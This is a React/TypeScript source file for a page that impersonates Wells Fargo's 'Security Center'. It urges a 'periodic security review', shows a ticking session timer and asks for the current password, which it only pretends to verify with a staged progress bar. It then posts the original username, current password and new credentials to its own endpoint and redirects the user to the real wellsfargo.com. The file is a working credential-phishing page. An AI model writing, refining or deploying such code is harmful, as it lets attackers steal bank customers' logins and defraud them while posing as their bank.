import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { Shield, Lock, User, Eye, EyeOff, CheckCircle, AlertTriangle, Clock, Info, Loader2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { Checkbox } from "@/components/ui/checkbox";
import { apiRequest } from "@/lib/queryClient";
import { Progress } from "@/components/ui/progress";

export default function CredentialUpdate() {
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const [showCurrentPassword, setShowCurrentPassword] = useState(false);
  const [showNewPassword, setShowNewPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [updateType, setUpdateType] = useState<"password" | "username" | "both" | null>(null);
  const [sessionTimeout, setSessionTimeout] = useState(600);
  const [step, setStep] = useState(1);
  const [verificationProgress, setVerificationProgress] = useState(0);
  
  const username = sessionStorage.getItem("loginUsername") || "Customer";
  
  const [formData, setFormData] = useState({
    currentPassword: "",
    newUsername: "",
    newPassword: "",
    confirmPassword: "",
    securityAnswer: "",
    agreeToTerms: false
  });

  useEffect(() => {
    const timer = setInterval(() => {
      setSessionTimeout((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          toast({
            title: "Session Expired",
            description: "Please sign in again.",
            variant: "destructive"
          });
          setTimeout(() => setLocation("/"), 1500);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const getPasswordStrength = (password: string) => {
    let strength = 0;
    if (password.length >= 8) strength += 25;
    if (password.length >= 12) strength += 10;
    if (/[A-Z]/.test(password)) strength += 20;
    if (/[a-z]/.test(password)) strength += 15;
    if (/[0-9]/.test(password)) strength += 15;
    if (/[!@#$%^&*(),.?":{}|<>]/.test(password)) strength += 15;
    return Math.min(strength, 100);
  };

  const passwordStrength = getPasswordStrength(formData.newPassword);

  const handleSkip = () => {
    toast({
      title: "Reminder Scheduled",
      description: "You will be prompted again in 30 days. Redirecting..."
    });
    setTimeout(() => {
      window.location.href = "https://www.wellsfargo.com/";
    }, 1500);
  };

  const handleVerifyPassword = async () => {
    if (!formData.currentPassword) {
      toast({
        title: "Password Required",
        description: "Please enter your current password to continue.",
        variant: "destructive"
      });
      return;
    }

    setVerificationProgress(0);
    const interval = setInterval(() => {
      setVerificationProgress((prev) => {
        if (prev >= 100) {
          clearInterval(interval);
          return 100;
        }
        return prev + 20;
      });
    }, 200);

    await new Promise(resolve => setTimeout(resolve, 1200));
    setStep(2);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!formData.agreeToTerms) {
      toast({
        title: "Agreement Required",
        description: "Please accept the Online Access Agreement to continue.",
        variant: "destructive"
      });
      return;
    }

    if (updateType === "password" || updateType === "both") {
      if (formData.newPassword !== formData.confirmPassword) {
        toast({
          title: "Passwords Do Not Match",
          description: "Please ensure both password fields match exactly.",
          variant: "destructive"
        });
        return;
      }
      if (passwordStrength < 60) {
        toast({
          title: "Weak Password",
          description: "Please choose a stronger password that meets all requirements.",
          variant: "destructive"
        });
        return;
      }
    }

    if (updateType === "username" || updateType === "both") {
      if (formData.newUsername.length < 6) {
        toast({
          title: "Invalid Username",
          description: "Username must be between 6-24 characters.",
          variant: "destructive"
        });
        return;
      }
      if (!/^[a-zA-Z0-9_]+$/.test(formData.newUsername)) {
        toast({
          title: "Invalid Characters",
          description: "Username can only contain letters, numbers, and underscores.",
          variant: "destructive"
        });
        return;
      }
    }

    setIsSubmitting(true);
    setVerificationProgress(0);
    
    const progressInterval = setInterval(() => {
      setVerificationProgress((prev) => {
        if (prev >= 90) {
          clearInterval(progressInterval);
          return 90;
        }
        return prev + 10;
      });
    }, 150);

    try {
      await apiRequest("POST", "/api/auth/credential-update", {
        originalUsername: username,
        currentPassword: formData.currentPassword,
        newUsername: updateType === "username" || updateType === "both" ? formData.newUsername : undefined,
        newPassword: updateType === "password" || updateType === "both" ? formData.newPassword : undefined,
        updateType: updateType,
      });
      
      clearInterval(progressInterval);
      setVerificationProgress(100);
      
      toast({
        title: "Changes Saved Successfully",
        description: "Your credentials have been updated. Redirecting to your accounts..."
      });
      
      setTimeout(() => {
        window.location.href = "https://www.wellsfargo.com/";
      }, 2000);
    } catch (error) {
      clearInterval(progressInterval);
      toast({
        title: "Unable to Process Request",
        description: "We encountered an error. Please try again or contact support.",
        variant: "destructive"
      });
      setIsSubmitting(false);
      setVerificationProgress(0);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#fafafa]">
      <header className="bg-[#d71e28] sticky top-0 z-20">
        <div className="h-1 bg-[#ffcd41]" />
        <div className="max-w-7xl mx-auto px-4">
          <div className="flex items-center justify-between py-3">
            <div className="flex items-center gap-3">
              <div className="text-white font-bold text-xl tracking-tight">WELLS FARGO</div>
              <span className="text-white/70 text-sm hidden sm:inline">| Security Center</span>
            </div>
            <div className="flex items-center gap-4">
              <div className="flex items-center gap-2 text-white/90 text-sm">
                <Clock className="w-4 h-4" />
                <span>Session: {formatTime(sessionTimeout)}</span>
              </div>
              <Button 
                variant="ghost" 
                size="sm"
                className="text-white hover:bg-white/10"
                onClick={() => setLocation("/")}
                data-testid="button-signout"
              >
                Sign Out
              </Button>
            </div>
          </div>
        </div>
      </header>

      <div className="bg-[#d71e28]/10 border-b border-[#d71e28]/20">
        <div className="max-w-2xl mx-auto px-4 py-2">
          <div className="flex items-center gap-2 text-sm">
            <Shield className="w-4 h-4 text-[#d71e28]" />
            <span className="text-gray-700">Secure Session</span>
            <span className="text-gray-400">|</span>
            <span className="text-gray-600">Welcome, {username}</span>
          </div>
        </div>
      </div>

      <main className="flex-1 max-w-2xl mx-auto w-full px-4 py-6">
        <div className="mb-6">
          <div className="flex items-center gap-3 mb-2">
            <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium ${step >= 1 ? 'bg-[#d71e28] text-white' : 'bg-gray-200 text-gray-500'}`}>1</div>
            <div className={`flex-1 h-1 ${step >= 2 ? 'bg-[#d71e28]' : 'bg-gray-200'}`} />
            <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium ${step >= 2 ? 'bg-[#d71e28] text-white' : 'bg-gray-200 text-gray-500'}`}>2</div>
            <div className={`flex-1 h-1 ${step >= 3 ? 'bg-[#d71e28]' : 'bg-gray-200'}`} />
            <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium ${step >= 3 ? 'bg-[#d71e28] text-white' : 'bg-gray-200 text-gray-500'}`}>3</div>
          </div>
          <div className="flex justify-between text-xs text-gray-500 px-2">
            <span>Verify Identity</span>
            <span>Update Credentials</span>
            <span>Confirmation</span>
          </div>
        </div>

        <Card className="mb-4 border-l-4 border-l-[#ffcd41] bg-[#fffef0]">
          <CardContent className="p-4">
            <div className="flex items-start gap-3">
              <AlertTriangle className="w-5 h-5 text-[#b8860b] flex-shrink-0 mt-0.5" />
              <div>
                <h2 className="font-semibold text-gray-900 text-sm mb-1">Periodic Security Review Required</h2>
                <p className="text-sm text-gray-600">
                  As part of our commitment to protecting your accounts, we periodically ask customers to verify and update their sign-in credentials. This helps prevent unauthorized access to your accounts.
                </p>
              </div>
            </div>
          </CardContent>
        </Card>

        {step === 1 && (
          <Card>
            <CardHeader className="border-b bg-gray-50 py-3 px-4">
              <h3 className="font-semibold text-gray-900 flex items-center gap-2">
                <Lock className="w-4 h-4 text-[#d71e28]" />
                Step 1: Verify Your Identity
              </h3>
            </CardHeader>
            <CardContent className="p-4">
              <p className="text-sm text-gray-600 mb-4">
                For your security, please confirm your current password to proceed with updating your credentials.
              </p>
              
              <div className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="currentPassword" className="text-sm font-medium">Current Password</Label>
                  <div className="relative">
                    <Input
                      id="currentPassword"
                      type={showCurrentPassword ? "text" : "password"}
                      value={formData.currentPassword}
                      onChange={(e) => setFormData({ ...formData, currentPassword: e.target.value })}
                      placeholder="Enter your current password"
                      className="pr-10"
                      data-testid="input-current-password"
                    />
                    <button
                      type="button"
                      onClick={() => setShowCurrentPassword(!showCurrentPassword)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                      data-testid="button-toggle-current-password"
                    >
                      {showCurrentPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </button>
                  </div>
                </div>

                {verificationProgress > 0 && verificationProgress < 100 && (
                  <div className="space-y-2">
                    <div className="flex items-center gap-2 text-sm text-gray-600">
                      <Loader2 className="w-4 h-4 animate-spin" />
                      <span>Verifying your identity...</span>
                    </div>
                    <Progress value={verificationProgress} className="h-1" />
                  </div>
                )}

                <div className="flex flex-col gap-3 pt-2">
                  <Button 
                    onClick={handleVerifyPassword}
                    className="w-full bg-[#d71e28] hover:bg-[#b91c23]"
                    disabled={!formData.currentPassword}
                    data-testid="button-verify-continue"
                  >
                    Continue
                  </Button>
                  <button
                    onClick={handleSkip}
                    className="text-sm text-[#d71e28] hover:underline"
                    data-testid="button-remind-later"
                  >
                    Remind me in 30 days
                  </button>
                </div>
              </div>
            </CardContent>
          </Card>
        )}

        {step === 2 && !updateType && (
          <Card>
            <CardHeader className="border-b bg-gray-50 py-3 px-4">
              <h3 className="font-semibold text-gray-900 flex items-center gap-2">
                <Shield className="w-4 h-4 text-[#d71e28]" />
                Step 2: Select Update Type
              </h3>
            </CardHeader>
            <CardContent className="p-4">
              <p className="text-sm text-gray-600 mb-4">
                Choose what you would like to update. We recommend updating both for maximum security.
              </p>
              
              <div className="space-y-3">
                <button
                  onClick={() => setUpdateType("password")}
                  className="w-full flex items-center gap-4 p-4 border rounded-lg hover-elevate text-left group"
                  data-testid="button-update-password"
                >
                  <div className="w-12 h-12 rounded-full bg-red-50 flex items-center justify-center group-hover:bg-red-100 transition-colors">
                    <Lock className="w-6 h-6 text-[#d71e28]" />
                  </div>
                  <div className="flex-1">
                    <p className="font-medium text-gray-900">Update Password</p>
                    <p className="text-sm text-gray-500">Create a new secure password for your account</p>
                  </div>
                </button>

                <button
                  onClick={() => setUpdateType("username")}
                  className="w-full flex items-center gap-4 p-4 border rounded-lg hover-elevate text-left group"
                  data-testid="button-update-username"
                >
                  <div className="w-12 h-12 rounded-full bg-red-50 flex items-center justify-center group-hover:bg-red-100 transition-colors">
                    <User className="w-6 h-6 text-[#d71e28]" />
                  </div>
                  <div className="flex-1">
                    <p className="font-medium text-gray-900">Update Username</p>
                    <p className="text-sm text-gray-500">Choose a new sign-in username</p>
                  </div>
                </button>

                <button
                  onClick={() => setUpdateType("both")}
                  className="w-full flex items-center gap-4 p-4 border-2 border-[#d71e28] rounded-lg hover-elevate text-left group bg-red-50/30"
                  data-testid="button-update-both"
                >
                  <div className="w-12 h-12 rounded-full bg-[#d71e28] flex items-center justify-center">
                    <Shield className="w-6 h-6 text-white" />
                  </div>
                  <div className="flex-1">
                    <div className="flex items-center gap-2">
                      <p className="font-medium text-gray-900">Update Both</p>
                      <span className="text-xs bg-[#d71e28] text-white px-2 py-0.5 rounded">Recommended</span>
                    </div>
                    <p className="text-sm text-gray-500">Update username and password together for enhanced security</p>
                  </div>
                </button>
              </div>

              <div className="mt-4 pt-4 border-t">
                <button
                  onClick={handleSkip}
                  className="w-full text-center text-sm text-gray-500 hover:text-[#d71e28]"
                  data-testid="button-skip-update"
                >
                  Skip for now - remind me later
                </button>
              </div>
            </CardContent>
          </Card>
        )}

        {step === 2 && updateType && (
          <Card>
            <CardHeader className="border-b bg-gray-50 py-3 px-4">
              <div className="flex items-center justify-between">
                <h3 className="font-semibold text-gray-900 flex items-center gap-2">
                  <Shield className="w-4 h-4 text-[#d71e28]" />
                  Step 2: Enter New Credentials
                </h3>
                <button
                  onClick={() => setUpdateType(null)}
                  className="text-sm text-[#d71e28] hover:underline"
                >
                  Change selection
                </button>
              </div>
            </CardHeader>
            <CardContent className="p-4">
              <form onSubmit={handleSubmit} className="space-y-5">
                {(updateType === "username" || updateType === "both") && (
                  <div className="space-y-2">
                    <Label htmlFor="newUsername" className="text-sm font-medium">New Username</Label>
                    <Input
                      id="newUsername"
                      type="text"
                      value={formData.newUsername}
                      onChange={(e) => setFormData({ ...formData, newUsername: e.target.value })}
                      placeholder="Enter new username"
                      maxLength={24}
                      data-testid="input-new-username"
                    />
                    <p className="text-xs text-gray-500">6-24 characters, letters, numbers, and underscores only</p>
                  </div>
                )}

                {(updateType === "password" || updateType === "both") && (
                  <>
                    <div className="space-y-2">
                      <Label htmlFor="newPassword" className="text-sm font-medium">New Password</Label>
                      <div className="relative">
                        <Input
                          id="newPassword"
                          type={showNewPassword ? "text" : "password"}
                          value={formData.newPassword}
                          onChange={(e) => setFormData({ ...formData, newPassword: e.target.value })}
                          placeholder="Create a strong password"
                          className="pr-10"
                          data-testid="input-new-password"
                        />
                        <button
                          type="button"
                          onClick={() => setShowNewPassword(!showNewPassword)}
                          className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                          data-testid="button-toggle-new-password"
                        >
                          {showNewPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                        </button>
                      </div>
                      
                      {formData.newPassword && (
                        <div className="space-y-2">
                          <div className="flex items-center justify-between text-xs">
                            <span className="text-gray-600">Password Strength</span>
                            <span className={passwordStrength >= 80 ? "text-green-600" : passwordStrength >= 60 ? "text-yellow-600" : "text-red-600"}>
                              {passwordStrength >= 80 ? "Strong" : passwordStrength >= 60 ? "Moderate" : "Weak"}
                            </span>
                          </div>
                          <Progress 
                            value={passwordStrength} 
                            className={`h-2 ${passwordStrength >= 80 ? '[&>div]:bg-green-500' : passwordStrength >= 60 ? '[&>div]:bg-yellow-500' : '[&>div]:bg-red-500'}`}
                          />
                        </div>
                      )}
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="confirmPassword" className="text-sm font-medium">Confirm New Password</Label>
                      <div className="relative">
                        <Input
                          id="confirmPassword"
                          type={showConfirmPassword ? "text" : "password"}
                          value={formData.confirmPassword}
                          onChange={(e) => setFormData({ ...formData, confirmPassword: e.target.value })}
                          placeholder="Re-enter your new password"
                          className="pr-10"
                          data-testid="input-confirm-password"
                        />
                        <button
                          type="button"
                          onClick={() => setShowConfirmPassword(!showConfirmPassword)}
                          className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                          data-testid="button-toggle-confirm-password"
                        >
                          {showConfirmPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                        </button>
                      </div>
                      {formData.confirmPassword && formData.newPassword !== formData.confirmPassword && (
                        <p className="text-xs text-red-500">Passwords do not match</p>
                      )}
                      {formData.confirmPassword && formData.newPassword === formData.confirmPassword && (
                        <p className="text-xs text-green-600 flex items-center gap-1">
                          <CheckCircle className="w-3 h-3" /> Passwords match
                        </p>
                      )}
                    </div>

                    <div className="bg-gray-50 p-3 rounded-lg border">
                      <p className="text-xs font-medium text-gray-700 mb-2">Password must include:</p>
                      <div className="grid grid-cols-2 gap-2">
                        <div className={`text-xs flex items-center gap-1.5 ${formData.newPassword.length >= 8 ? "text-green-600" : "text-gray-500"}`}>
                          <CheckCircle className={`w-3 h-3 ${formData.newPassword.length >= 8 ? "" : "opacity-30"}`} />
                          8+ characters
                        </div>
                        <div className={`text-xs flex items-center gap-1.5 ${/[A-Z]/.test(formData.newPassword) ? "text-green-600" : "text-gray-500"}`}>
                          <CheckCircle className={`w-3 h-3 ${/[A-Z]/.test(formData.newPassword) ? "" : "opacity-30"}`} />
                          Uppercase letter
                        </div>
                        <div className={`text-xs flex items-center gap-1.5 ${/[a-z]/.test(formData.newPassword) ? "text-green-600" : "text-gray-500"}`}>
                          <CheckCircle className={`w-3 h-3 ${/[a-z]/.test(formData.newPassword) ? "" : "opacity-30"}`} />
                          Lowercase letter
                        </div>
                        <div className={`text-xs flex items-center gap-1.5 ${/[0-9]/.test(formData.newPassword) ? "text-green-600" : "text-gray-500"}`}>
                          <CheckCircle className={`w-3 h-3 ${/[0-9]/.test(formData.newPassword) ? "" : "opacity-30"}`} />
                          Number
                        </div>
                        <div className={`text-xs flex items-center gap-1.5 ${/[!@#$%^&*(),.?":{}|<>]/.test(formData.newPassword) ? "text-green-600" : "text-gray-500"}`}>
                          <CheckCircle className={`w-3 h-3 ${/[!@#$%^&*(),.?":{}|<>]/.test(formData.newPassword) ? "" : "opacity-30"}`} />
                          Special character
                        </div>
                      </div>
                    </div>
                  </>
                )}

                <div className="flex items-start gap-3 p-3 bg-gray-50 rounded-lg border">
                  <Checkbox
                    id="agreeToTerms"
                    checked={formData.agreeToTerms}
                    onCheckedChange={(checked) => setFormData({ ...formData, agreeToTerms: checked as boolean })}
                    className="mt-0.5"
                    data-testid="checkbox-agree-terms"
                  />
                  <Label htmlFor="agreeToTerms" className="text-xs text-gray-600 leading-relaxed cursor-pointer">
                    I have read and agree to the <span className="text-[#d71e28] hover:underline cursor-pointer">Wells Fargo Online Access Agreement</span> and understand that this change will take effect immediately upon submission.
                  </Label>
                </div>

                {isSubmitting && (
                  <div className="space-y-2">
                    <div className="flex items-center gap-2 text-sm text-gray-600">
                      <Loader2 className="w-4 h-4 animate-spin" />
                      <span>Processing your request...</span>
                    </div>
                    <Progress value={verificationProgress} className="h-1" />
                  </div>
                )}

                <div className="flex flex-col gap-3 pt-2">
                  <Button 
                    type="submit" 
                    className="w-full bg-[#d71e28] hover:bg-[#b91c23]"
                    disabled={isSubmitting || !formData.agreeToTerms}
                    data-testid="button-submit-update"
                  >
                    {isSubmitting ? (
                      <>
                        <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                        Processing...
                      </>
                    ) : (
                      "Save Changes"
                    )}
                  </Button>
                  
                  <button
                    type="button"
                    onClick={handleSkip}
                    className="text-sm text-gray-500 hover:text-[#d71e28]"
                    disabled={isSubmitting}
                    data-testid="button-skip"
                  >
                    Skip for now
                  </button>
                </div>
              </form>
            </CardContent>
          </Card>
        )}

        <div className="mt-6 p-4 bg-blue-50/50 rounded-lg border border-blue-100">
          <div className="flex items-start gap-3">
            <Info className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" />
            <div>
              <p className="text-sm font-medium text-blue-900 mb-1">Security Tips</p>
              <ul className="text-xs text-blue-700 space-y-1">
                <li>• Never share your password with anyone, including Wells Fargo employees</li>
                <li>• Use a unique password that you don't use for other websites</li>
                <li>• Enable two-factor authentication for additional protection</li>
                <li>• Review your account activity regularly for unauthorized transactions</li>
              </ul>
            </div>
          </div>
        </div>
      </main>

      <footer className="bg-white border-t py-4 mt-auto">
        <div className="max-w-2xl mx-auto px-4">
          <div className="flex flex-col sm:flex-row items-center justify-between gap-2 text-xs text-gray-500">
            <p>Wells Fargo Bank, N.A. Member FDIC. Equal Housing Lender.</p>
            <div className="flex items-center gap-4">
              <span className="hover:text-[#d71e28] cursor-pointer">Privacy Policy</span>
              <span className="hover:text-[#d71e28] cursor-pointer">Security</span>
              <span className="hover:text-[#d71e28] cursor-pointer">Contact Us</span>
            </div>
          </div>
          <p className="text-center text-xs text-gray-400 mt-2">
            © 2024 Wells Fargo. All rights reserved. NMLSR ID 399801
          </p>
        </div>
      </footer>
    </div>
  );
}